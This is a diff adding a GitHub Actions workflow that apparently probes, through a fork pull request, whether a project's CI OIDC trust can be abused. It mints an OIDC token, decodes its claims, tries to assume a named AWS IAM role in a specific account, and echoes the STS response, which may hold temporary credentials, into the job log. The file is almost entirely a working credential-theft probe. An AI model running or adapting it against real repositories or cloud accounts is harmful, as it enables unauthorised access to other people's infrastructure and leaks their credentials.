@@ -1,0 +1,35 @@
+name: oidc-forkpr2-i162395
+on:
+  pull_request:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    permissions:
+      id-token: write
+      contents: read
+    steps:
+      - name: env
+        run: |
+          echo "WF2=i162395-JOBLEVEL-PERMS"
+          echo "EVENT=$GITHUB_EVENT_NAME"
+          echo "REPOSITORY=$GITHUB_REPOSITORY"
+          echo "PR_HEAD_REPO=$(jq -r '.pull_request.head.repo.full_name // "n/a"' "$GITHUB_EVENT_PATH")"
+          echo "PR_BASE_REPO=$(jq -r '.pull_request.base.repo.full_name // "n/a"' "$GITHUB_EVENT_PATH")"
+          echo "PERMS_JSON=$(jq -c '.permissions // empty' "$GITHUB_EVENT_PATH")"
+          if [ -n "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ]; then echo "OIDC_ENV=SET"; else echo "OIDC_ENV=UNSET"; fi
+          if [ -n "${ACTIONS_ID_TOKEN_REQUEST_TOKEN:-}" ]; then echo "OIDC_TOKEN_ENV=SET"; else echo "OIDC_TOKEN_ENV=UNSET"; fi
+      - name: mint-and-exchange
+        run: |
+          set +e
+          if [ -z "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ]; then echo "NO_OIDC_ENDPOINT"; exit 0; fi
+          RESP=$(curl -sS -G -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" --data-urlencode "audience=sts.amazonaws.com" "$ACTIONS_ID_TOKEN_REQUEST_URL")
+          V=$(echo "$RESP" | jq -r '.value')
+          echo "JWT_LEN=${#V}"
+          echo "$V" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | jq -c '{iss,aud,sub,event_name,repository}'
+          OUT=$(aws sts assume-role-with-web-identity --role-arn arn:aws:iam::213020545630:role/github-runner-role --role-session-name i162395-forkpr2 --web-identity-token "$V" --duration-seconds 900 --region us-east-1 --output json 2>&1)
+          echo "OXEN_EXCHANGE_RC=$?"
+          echo "OXEN_EXCHANGE_OUT=$(echo "$OUT" | head -3 | tr '\n' ' ')"
